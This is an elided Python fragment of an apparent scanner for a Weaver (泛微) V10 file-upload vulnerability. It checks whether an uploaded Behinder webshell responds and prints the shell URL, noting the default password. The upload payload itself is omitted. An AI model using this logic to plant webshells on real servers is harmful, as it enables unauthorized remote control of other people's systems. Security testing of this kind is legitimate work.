...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测泛微V10文件上传漏洞")
    try:
        ...
        if upload.status_code == 200:
            if shell.status_code == 200 and "9df37afc77bdd582d90aefaf4e35c63e" in shell.txt:
                print(now_time() + ' [SUCCESS]  泛微文件上传漏洞存在,冰蝎默认密码:{}'.format(shell_url))
            else:
                print(now_time() + ' [WARNING]  泛微ktreeuploadAction上传漏洞payload执行成功，但木马检测失败哦')
        else:
